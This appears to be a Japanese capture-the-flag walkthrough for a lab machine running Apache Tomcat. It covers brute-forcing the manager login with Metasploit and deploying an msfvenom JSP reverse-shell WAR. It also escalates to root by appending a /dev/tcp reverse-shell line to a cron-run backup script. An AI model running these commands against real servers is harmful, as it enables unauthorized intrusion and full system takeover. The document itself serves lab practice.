## 論点
- Apache(Tomcat) basic認証
## 注意
- スナップショットを撮っておく。そしてシステムのメインメモリーを4096MBくらいにしておく
- サイトがうまく見れない時は一回削除して、初めからインポートする
## 攻略
- nmap 22,8080
- webサイトをチェックする
  - apache tomcatのサイト。apache tomcatそもそも何か調べてみる
- exploitdbで調べる
  - remote code exectionができると書いてある  
- ログインしようとする、これはbasic認証
  - ログインをbrute forceで実行する。hydraでもできるが、ここではmsfconsoleを使う
  - optionsコマンドを見たらわかるが、暗号辞書とユーザ辞書がデフォルトで設定されているのがわかる
  - 

```
msfconsole -q
search apache tomcat
use auxiliary/scanner/http/tomcat_mgr_login
set rhosts 192.168.56.113
exploit
```


- ユーザ名が`tomcat`でパスワードが`role1`
- webサイトからログインする
  - ボタンをいろいろ押すとbasic認証が出てくる
  - `List Application`を選択する
  - 真ん中のところに`WAR file to deploy`ここから、reverse-shellをuploadする 


- リバースシェルをする
  - msfvenomを作る
  - これはphp-reverse-shell.phpのJava言語に替えたもの
  - `msfvenom -p java/jsp_shell_reverse_tcp lhost=192.168.56.101 lport=9001 -f war > shell.war`
  - ブラウザからshell.warを選択する
  - Parrotで待ち受ける
  - 一覧のリストからshell.warを押すとプロンプトが返ってくる
- 対話型シェルにする
- thalesのhomeにnotes.txtという気になるのがある
- ユーザの切り替え
  - `su thales` 
  - passwordは`vodka06`

- rootになる
  - `echo 'bash -i >& /dev/tcp/192.168.56.101/4242 0>&1' >> /usr/local/bin/backup.sh`
  - `nc -nlvp 4242`
  - 5分ぐらい待つとrootになる
